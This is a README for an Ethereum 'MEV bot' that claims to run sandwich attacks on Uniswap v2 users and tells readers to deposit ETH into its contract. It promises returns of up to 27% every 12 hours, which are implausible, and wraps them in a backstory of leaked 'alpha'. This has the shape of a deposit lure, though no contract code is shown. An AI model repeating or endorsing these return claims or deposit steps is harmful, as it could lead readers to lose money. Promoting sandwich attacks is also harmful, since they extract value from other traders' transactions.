# MEV Bot ðŸš€
ETH MEV-BOT for sandwich attack on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that allows deployers of contract to take profits from tokens.

Uniswap v2 MEV bot - Updated mempool settings - April 2023 The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.

Bot sends the Transaction and sniffs the Uniswap v2 Mempool for txs with high slippage, calculating if a sandwich attack is profitable.

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity, my bot always puts 1 gas more than everybody elses, as long as it remains profitable, securing a large amount of profitable transactions. 

Then sends back the ETH to the contract ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

MEV bot Instructions (works only for Mainnet)


# Deposits
**Deposits of lower than 0.4 ETH are going to find much fewer txs because of the gas fees**

**Higher amounts of ETH deposited into the contract result in a larger amount of successful sandwich attack txs, therefore more profit**

**For higher profits use above 1.2 ETH**

# Expected returns
**0.1ETH - 0.4ETH = up to 10%/12hrs** 

**0.4ETH - 1.2ETH = up to 20%/12hrs**

**1.2ETH - 2.4ETH = 20-27%/12hrs**

**2.4ETH+ = 27%++ every 12 hrs**

You can see an example of how the bot works. The bot will make transactions on your entire balance to increase profit

Wait a couple of days for a profit. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 0.5-1 Î•Î¤Î—.

At any time you can Stop bot or return your money by calling the withdrawal function.
